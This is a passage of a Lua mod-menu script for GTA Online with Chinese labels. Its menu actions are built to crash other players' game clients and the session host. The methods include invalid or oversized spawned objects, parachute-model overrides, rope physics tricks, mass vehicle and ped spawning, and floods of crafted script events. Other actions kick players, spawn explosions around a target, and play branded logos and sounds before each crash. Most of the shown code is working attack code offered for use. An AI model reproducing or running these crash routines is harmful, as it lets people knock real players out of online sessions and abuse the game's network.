            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    end)
end
    menu.action(player_removals, "无效物体崩溃", {}, "崩溃其他玩家游戏", function()
        menu.trigger_commands("anticrashcam on")
        InvalidObjectCrash(PlayerID)
        menu.trigger_commands("anticrashcam off")
        notification( "崩溃完成", black)
    end)
    menu.action(player_removals, "新闻联播V1", {"xinwenV1"}, "", function()
         YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinwen.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 14 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
      store_dir = filesystem.store_dir() .. '\\YMss\\'
      sound_selection_dir = store_dir .. '\\sound5.txt'
      if not filesystem.is_dir(store_dir) then
         util.toast("夜幕音频没有正确安装！.")
         util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
        fragcrash_v1(PlayerID)
        notification( "崩溃完成", green)
    end)
    menu.action(player_removals, "新闻崩溃V2", {"xinwenV2"}, "每天晚上19：00准时播出", function()
          YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinwen.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 14 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
      store_dir = filesystem.store_dir() .. '\\YMss\\'
      sound_selection_dir = store_dir .. '\\sound5.txt'
      if not filesystem.is_dir(store_dir) then
         util.toast("夜幕音频没有正确安装！.")
         util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
        fragcrash_v2(PlayerID)
        notification( "崩溃完成", green)
    end)
    menu.action(player_removals, "病毒崩溃", {}, "崩溃其他玩家游戏", function()
      util.toast("病毒，快快散去！~")
    
		    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local cargobob = CreateVehicle(0XFCFCB68B, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
            local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
            local vehicle = CreateVehicle(0X187D938D, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
            local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local newRope = PHYSICS.ADD_ROPE(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, vehicle, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehiclePos.x, vehiclePos.y, vehiclePos.z, 2, false, false, 0, 0, "Center", "Center")
            util.yield(1000)
            PHYSICS.ROPE_UNLOAD_TEXTURES()
            entities.delete_by_handle(cargobob)
            entities.delete_by_handle(vehicle)
            entities.delete_by_handle(newRope)
            notification( "崩溃完成", green)
    end)
    menu.action(player_removals, "开降落伞崩溃", {}, "崩溃其他玩家游戏", function()
        OpenParachuteCrash(PlayerID)
        notification( "崩溃完成", green)
    end)
    menu.action(player_removals, "换降落伞崩溃", {}, "崩溃其他玩家游戏", function()
        ChangeParachuteCrash(PlayerID)
        notification( "崩溃完成", green)
    end)
    menu.action(player_removals, "猪猪侠崩溃", {"zzxcrash"}, "请耐心等待崩溃完成！（约15秒）", function()
         YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'zhuzhu.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.35, 0.5,0, 3, 3, 3, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 10 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
      store_dir = filesystem.store_dir() .. '\\YMss\\'
      sound_selection_dir = store_dir .. '\\sound13.txt'
      if not filesystem.is_dir(store_dir) then
         util.toast("夜幕音频没有正确安装！.")
         util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
        lestcrash(PlayerID)
        dongge(PlayerID)
        MDS(PlayerID)
 end)
 function M9crash(PlayerID)
            local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
            pos.z = pos.z + 5
            veh = entities.get_all_vehicles_as_handles()
            
          for i = 1, #veh do
          NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
          ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 777)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 17, 888)
          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
          end
      end
    local wanjiabengkui = menu.list(player_removals, "崩溃崩溃崩溃~~", {}, "")
    menu.action(wanjiabengkui, "M9崩溃", {"six6crash"}, "M9crash", function()
        M9crash(PlayerID)
     end)
---天御崩溃
function TYcrash(PlayerID)
    for pedp_crash = 2 , 6 do
    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    util.yield(5000)
    for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
     menu.action(wanjiabengkui, "天御崩溃", {"TY"}, "", function()
        TYcrash(PlayerID)
     end)
---主机崩
function hostcrash(PlayerID)
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    menu.trigger_commands("tpmazehelipad")
    ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
    util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
end
     menu.action(wanjiabengkui, "gaga崩", {}, "崩溃主机（请提前把主机优先级为最低）（主机崩）", function(PlayerID)
               YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'gaga.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 3 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
        hostcrash(PlayerID)
     end)
    menu.action(wanjiabengkui, "none崩溃", {"scriptcrashnone"}, "脚本崩溃", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                end
                util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                end
                menu.trigger_commands("givesh" .. players.get_name(PlayerID))
                util.yield(100)
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
    end)
function ghostcrash(PlayerID)
    local mdl = util.joaat("apa_mp_apa_yacht")
    local user = players.user_ped()
    BlockSyncs(PlayerID, function()
    util.yield(250)
    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    Jinx.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    util.yield(50)
    local pos = players.get_position(PlayerID)
    pos.z += 300
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
    repeat
        util.yield()
    until PED.GET_PED_PARACHUTE_STATE(user) == 0
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    util.yield(50)
    TASK.CLEAR_PED_TASKS(user)
    util.yield(50)
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    repeat
        util.yield()
    until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
    Jinx.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x, old_pos.y, old_pos.z, false, false)
    end)
end
--小鬼崩溃
function ghostcrash(PlayerID)
    fishmm = state
    local TargetPPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPPos = ENTITY.GET_ENTITY_COORDS(TargetPPed)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1992.8982, -780.7021, -0.37660158, false, false, false, false)
    menu.trigger_commands("levitatepassivemax 0")
    menu.trigger_commands("levitateassistup 0")
    menu.trigger_commands("levitateassistdown 0")
    menu.trigger_commands("noguns")
    menu.trigger_commands("invisibility on")
    util.yield(1000)
    menu.trigger_commands("acfish")
    util.yield(100)
    menu.trigger_commands(" on")
    util.yield(100)
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1813897027,15,true,true)
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),TargetPPos.x,TargetPPos.y,TargetPPos.z, false, false, false, false)
    util.yield(100)
util.yield(9000)
if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
    menu.trigger_commands("mpmale")
else
    menu.trigger_commands("mpfemale")
end
menu.trigger_commands("levitatepassivemax 0.6")
menu.trigger_commands("levitateassistup 0.6")
menu.trigger_commands("levitateassistdown 0.6")
menu.trigger_commands("levitate off")
menu.trigger_commands("noguns")
menu.trigger_commands("invisibility off")
notification("崩溃完成", colors.black)
while fishmm do
    util.yield()
    PAD._SET_CONTROL_NORMAL(0, 25, 1)
end
end
    menu.action(wanjiabengkui, "小鬼崩溃", {"ghostcrash"}, "猫猫", function(state)   
           YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xiaogui.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 3 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
        ghostcrash(PlayerID)
    end)
    menu.action(wanjiabengkui, "小宇崩溃", {"grief"}, "崩溃玩家.", function()
        YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xiaoyu.png')
        if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 3 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = players.get_position(PlayerID)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(PlayerID) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)
    menu.action(player_removals, "萝卜崩", {"luobobk"}, "", function()
        YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'luobo.png')
        if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 3 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
        menu.trigger_commands("six6crash " .. players.get_name(PlayerID))
         notification( "崩溃完成", colors.black)
    end)
    menu.action(player_removals, "奥义·制裁XPV1", {"crashxp"}, "", function()
        local cord = players.get_position(PlayerID)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(20)
        menu.trigger_commands("crash " .. players.get_name(PlayerID))
        menu.trigger_commands("smash " .. players.get_name(PlayerID))
        end
         notification( "崩溃完成", colors.black)
    end)
----------------------------------感谢南瓜、呆呆提供此崩溃----------------------------------------------------------
    menu.action(player_removals, "奥义·制裁XPV2", {"crash_xipro"}, "崩溃前7秒警告", function()	
		if seven_warn==true then
			chat.send_message("请注意 将在7秒后崩溃xipro 公屏发送数字 1 可更换战局",false,true,true)	
		util.yield(200)								
				chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
				if string.find(text,"1") then
				util.toast("find 1")
				menu.trigger_commands("kick" .. players.get_name(sender))
				end			
			end)
			util.yield(6000)
		end
		util.request_model("a_m_y_beach_04", 300)		
		util.request_model("raketrailer", 300)
		util.yield(1000)
			local player_ped_location = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))                  
					local ped_to_collect = entities.create_ped(0 , util.joaat("a_m_y_beach_04"), player_ped_location, 0)
			for j = 1,50,1 do						
					local model = {util.joaat("raketrailer"),}                    
                    ENTITY.SET_ENTITY_VISIBLE(ped_to_collect, true)                   
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped_to_collect, player_ped_location.x, player_ped_location.y, player_ped_location.z)
                        for spawn, value in pairs(model) do
                            local vels = {}
                            vels[spawn] = entities.create_vehicle(value, player_ped_location, 0)
							
                            for value,value1 in pairs(vels) do
                                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value1, ped_to_collect, 0, 0, true, true)
                            end
                        end                                            							
			end
			util.yield(300)				
                        menu.trigger_commands("explode" ..  players.get_name(PlayerID)) 
						menu.trigger_commands("explode" ..  players.get_name(PlayerID))
						menu.trigger_commands("explode" ..  players.get_name(PlayerID))
						util.yield(1000)						
         notification( "崩溃完成", colors.black)				
end)
menu.action(player_removals, "坤坤崩", {"ikuncrash"}, "哎呦~你干嘛~", function()
         store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound1.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
            menu.trigger_commands("givesh" .. players.get_name(PlayerID))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
    end)
   menu.toggle_loop(player_removals, "火车飞机漫天飞", {"huochefeijifly"}, "", function(train_loop)
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.z = stupid_pos.z + 1
        util.create_thread(function ()
            local mod_vel = {-1600252419,-1660661558,745926877,920453016,3186376089,1030400667,240201337,184361638,-32878452,1981688531}
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 7, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        util.yield(0)
                        end
                    end
                    util.yield(8000)
                    local ar_vs = entities.get_all_vehicles_as_handles()
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)
   	menu.action(player_removals, "消防栓的愤怒", {"xiaofangshuan"}, "", function ()
	        util.request_model(200846641)
	        local objects = {}
	        for i = 1, 40 do
	            local coords = players.get_position(PlayerID)
	            objects[#objects + 1] = entities.create_object(200846641, v3.new(coords.x , coords.y , coords.z))
	            util.yield()
	        end
	        util.yield(3000)
	        for i = 1, 4 do
	            local coords = players.get_position(PlayerID)
	            FIRE.ADD_EXPLOSION(coords.x , coords.y , coords.z, 64, 100, true, true, 0.5, true)
	            util.yield(400)
	        end
	        util.yield(500)
	        for i = 1, #objects do
	            entities.delete_by_handle(objects[i])
	        end
	        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(200846641)
	end)

    local pclpid = {}
    function get_control_request(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
